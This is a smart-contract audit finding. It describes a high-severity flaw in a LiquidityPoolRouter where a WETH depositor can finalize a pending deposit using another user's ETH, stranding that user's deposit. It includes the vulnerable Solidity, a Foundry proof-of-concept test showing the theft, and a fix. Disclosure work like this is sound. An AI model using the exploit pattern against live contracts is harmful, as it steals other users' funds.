# [H-1] - User can steal someone else's ETH to finalize his WETH deposit

## Finding Description

A user1 who tries to deposit `WETH` into the `WETH` pool will get his tokens locked in the `LiquidityPoolRouter` contract. The user1 can later steal another user2's `ETH` deposit and finalize his deposit using someone else's `ETH`.

## Impact Explanation

A user1 has the ability to call the `deposit` function in the `LiquidityPoolRouter` contract with the `WETH` token as parameter:

```js
function deposit(address token, uint256 amount) external payable nonReentrant whenNotPaused {
        address liquidityPool = _getLiquidityPoolOrRevert(token);

        _validateFinalizationIncentivePayment();

        uint256 depositFee = (amount * DEPOSIT_FEE_BASIS_POINTS) / 10_000;
        amount -= depositFee;

        _validateDepositAmount(liquidityPool, amount);

        if (deposits[msg.sender].amount != 0) {
            revert LiquidityPoolRouter__OngoingDeposit();
        }

        TRANSFER_MANAGER.transferERC20(token, msg.sender, address(this), amount);
        TRANSFER_MANAGER.transferERC20(token, msg.sender, owner, depositFee);

        uint256 expectedShares = ERC4626(liquidityPool).previewDeposit(amount);

        deposits[msg.sender] =
            Deposit(liquidityPool, amount, expectedShares, block.timestamp, finalizationParams.finalizationIncentive);
        pendingDeposits[liquidityPool] += amount;

        emit LiquidityPoolRouter__DepositInitialized(
            msg.sender, liquidityPool, amount + depositFee, expectedShares, finalizationParams.finalizationIncentive
        );
    }
```

During this function, user's `WETH` tokens are transfered from him to the `LiquidityPoolRouter` contract. Later, the `finalizeDeposit` function can't be completed because by protocol design, a user should be able to deposit in the `WETH` pool only by sending `ETH` to the `LiquidityPoolRouter` contract. In the `finalizeDeposit` function, when depositing to the `WETH` pool, the contract attempts to send `ETH` which it doesn't have, because the user1 deposited `WETH`. Unless, if another user2 comes in a later time who wants to deposit `ETH` , which user1 can use to finalize his deposit:

```js
    function finalizeDeposit(address depositor) external nonReentrant {
        uint256 amount = deposits[depositor].amount;
        if (amount == 0) {
            revert LiquidityPoolRouter__NoOngoingDeposit();
        }

        uint256 initializedAt = deposits[depositor].initializedAt;
        _validateTimelockIsOver(initializedAt);
        _validateFinalizationIsOpenForAll(depositor, initializedAt);

        address payable liquidityPool = payable(deposits[depositor].liquidityPool);
        address token = ERC4626(liquidityPool).asset();
        uint256 expectedShares = deposits[depositor].expectedShares;
        uint256 actualShares = ERC4626(liquidityPool).previewDeposit(amount);
        uint256 incentive = deposits[depositor].finalizationIncentive;

        deposits[depositor] = Deposit(address(0), 0, 0, 0, 0);
        pendingDeposits[liquidityPool] -= amount;

        _transferETHAndWrapIfFailWithGasLimit(WETH, msg.sender, incentive, 2_300);

        uint256 sharesMinted;
        uint256 amountRequired;
        if (expectedShares >= actualShares) {
            amountRequired = amount;
@>          sharesMinted = _deposit(token, liquidityPool, amountRequired, depositor);
        } else {
            amountRequired = ERC4626(liquidityPool).previewMint(expectedShares);
@>          sharesMinted = _deposit(token, liquidityPool, amountRequired, depositor);
            if (token == WETH) {
                _transferETHAndWrapIfFailWithGasLimit(WETH, liquidityPool, amount - amountRequired, gasleft());
            } else {
                _executeERC20DirectTransfer(token, liquidityPool, amount - amountRequired);
            }
        }

        emit LiquidityPoolRouter__DepositFinalized(msg.sender, depositor, liquidityPool, amountRequired, sharesMinted);
    }
```
```js
    function _deposit(address token, address liquidityPool, uint256 amount, address depositor)
        private
        returns (uint256 sharesMinted)
    {
@>      if (token == WETH) {
@>          IWETH(WETH).deposit{value: amount}();
        }
        IERC20(token).forceApprove(liquidityPool, amount);
        sharesMinted = LiquidityPool(liquidityPool).deposit(amount, depositor);
    }
```

## Proof of Concept

Paste the following code in `AttackPoC.t.sol` test file:

```js
    function test_attack_ProofOfConcept() public {
        vm.deal(user1, 20 ether);
        vm.deal(user2, 20 ether);

        vm.prank(user1);
        mockWETH.deposit{value: 10 ether}();

        // assert user1 has 10 WETH
        vm.assertEq(mockWETH.balanceOf(user1), 10 ether);

        // user1 initiates ERC20 deposit using WETH
        vm.startPrank(user1);
        _grantApprovals();
        mockWETH.approve(address(transferManager), 10 ether);
        liquidityPoolRouter.deposit{value: 0.0003 ether}(address(mockWETH), 10 ether);
        vm.stopPrank();

        vm.warp(block.timestamp + 10 seconds);

        // when user1 tries to finalizeDeposit it reverts
        vm.expectRevert();
        vm.prank(user1);
        liquidityPoolRouter.finalizeDeposit(user1);

        // user2 wants to deposit ETH
        vm.prank(user2);
        liquidityPoolRouter.depositETH{value: 15 ether + 0.0003 ether}(15 ether);

        // user1 steals his ETH and finalizes his deposit
        vm.prank(user1);
        liquidityPoolRouter.finalizeDeposit(user1);

        vm.warp(block.timestamp + 10 seconds);

        // user2 can't finalize his deposit
        vm.expectRevert();
        vm.prank(user2);
        liquidityPoolRouter.finalizeDeposit(user2);
    }
```

## Recommendation

Don't allow ERC20 deposits of the `WETH` token in `LiquidityPoolRouter`:

```diff
    /**
     * @notice First step of the 2 steps deposit process. Commit ERC-20 token into the pool
     *         and estimate the expected amount of shares to be minted.
     *
     * @param token The deposit token
     * @param amount The deposit amount
     */
    function deposit(address token, uint256 amount) external payable nonReentrant whenNotPaused {
+       if(token == WETH){
+           revert();
+       }

        address liquidityPool = _getLiquidityPoolOrRevert(token);

        _validateFinalizationIncentivePayment();
        .
        .
        .
```